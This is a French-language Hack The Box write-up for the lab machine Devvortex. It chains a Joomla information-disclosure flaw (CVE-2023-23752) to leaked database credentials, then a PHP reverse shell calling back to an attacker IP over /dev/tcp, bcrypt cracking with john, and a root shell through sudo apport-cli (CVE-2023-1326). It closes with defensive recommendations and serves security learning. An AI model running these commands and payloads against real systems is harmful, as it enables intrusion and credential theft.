---
layout: post
title: Devvortex (HTB)
categories: markdown
series: ["HTB Writeups"]
summary: "Dans ce challenge Hack The Box, on exploite Joomla (CVE-2023-23752) pour obtenir des secrets applicatifs, puis on enchaine vers un accès utilisateur et une élévation de privilèges root via apport-cli (CVE-2023-1326)."
tags: [CTF, Joomla, CVE-2023-23752, CVE-2023-1326, HackTheBox, Cybersecurity]
date: 2023-09-20
showTableOfContents: true
---

## Introduction

Dans cette machine Easy de Hack The Box, l'objectif est de passer de l'énumération web à une compromission complète du système.

Chaîne d'attaque résumée:
- Découverte de `dev.devvortex.htb`
- Identification de Joomla vulnérable à `CVE-2023-23752`
- Récupération de secrets + identifiants
- Exécution de code via panneau admin Joomla
- Extraction d'un hash utilisateur depuis MySQL et crack du mot de passe
- Connexion SSH en tant que `logan`
- Escalade root via `apport-cli` (`CVE-2023-1326`)

## Enumeration

### Scan des ports

```bash
nmap -p- --min-rate 10000 -T4 10.10.11.242
nmap -sC -sV -p22,80 10.10.11.242
```

Services observés:
- 22/tcp: OpenSSH
- 80/tcp: nginx

### VHost et sous-domaine

Le site redirige vers `devvortex.htb`, donc on ajoute:

```bash
10.10.11.242 devvortex.htb
```

Recherche de sous-domaines virtuels:

```bash
gobuster vhost -u http://devvortex.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 20 -k
```

Résultat utile: `dev.devvortex.htb`

Ajout hosts:

```bash
10.10.11.242 devvortex.htb dev.devvortex.htb
```

## Joomla et CVE-2023-23752

Sur `dev.devvortex.htb`, on identifie Joomla (ex: `/readme.txt`, `/administrator`).

La vulnérabilité `CVE-2023-23752` permet d'accéder à des informations sensibles via une API exposée.

```bash
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
```

On récupère notamment des secrets de configuration et des informations qui facilitent la suite (dont des credentials valides vus dans plusieurs writeups publics).

Exemple d'identifiants récupérés:

```text
lewis:P4ntherg0t1n5r3c0n##
```

## Accès initial: www-data via Joomla Admin

Connexion à l'admin Joomla:

```text
http://dev.devvortex.htb/administrator
```

Après authentification, plusieurs méthodes sont possibles pour obtenir une exécution de commande:
- modification d'un template PHP existant
- upload d'une extension/plugin malveillante

Exemple minimal de payload PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
?>
```

Listener côté attaquant:

```bash
nc -lvnp 4444
```

Une fois le callback reçu:

```bash
script /dev/null -c /bin/bash
export TERM=xterm
```

On confirme le contexte:

```bash
id
# uid=33(www-data) gid=33(www-data)
```

## Mouvement latéral vers logan

Depuis `www-data`, on exploite les infos de connexion DB Joomla.

```bash
mysql -u lewis -p
# password: P4ntherg0t1n5r3c0n##
```

Dans MySQL:

```sql
show databases;
use joomla;
show tables;
select username,password from sd4fg_users;
```

On récupère un hash bcrypt pour `logan`. Ensuite on le crack offline:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt logan.hash
```

Le mot de passe trouvé dans de nombreux writeups publics est:

```text
tequieromucho
```

Connexion SSH:

```bash
ssh logan@10.10.11.242
```

Puis récupération user flag:

```bash
cat ~/user.txt
```

## Privilege Escalation root (CVE-2023-1326)

Vérification sudo:

```bash
sudo -l
```

Sortie clé:

```text
(ALL : ALL) /usr/bin/apport-cli
```

La version vulnérable de `apport-cli` permet d'obtenir une exécution de commande root via son flux interactif (CVE-2023-1326).

Lancement:

```bash
sudo /usr/bin/apport-cli -f
```

Selon le scénario, il faut sélectionner un rapport crash puis utiliser l'option qui ouvre un pager/éditeur et exécuter:

```bash
!/bin/bash
```

On obtient alors un shell root:

```bash
whoami
# root
cat /root/root.txt
```

## Conclusion

Cette machine illustre une chaîne d'attaque réaliste et propre:
- surface web Joomla exposée
- data disclosure critique (`CVE-2023-23752`)
- exécution de code via interface admin
- récupération de secrets DB et pivot utilisateur
- élévation root via binaire sudo mal sécurisé/vulnérable (`apport-cli`, `CVE-2023-1326`)

Points défensifs importants:
- patch management strict des CMS et dépendances système
- isolation des secrets applicatifs
- durcissement des droits sudo
- supervision des accès admin web et des exécutions anormales
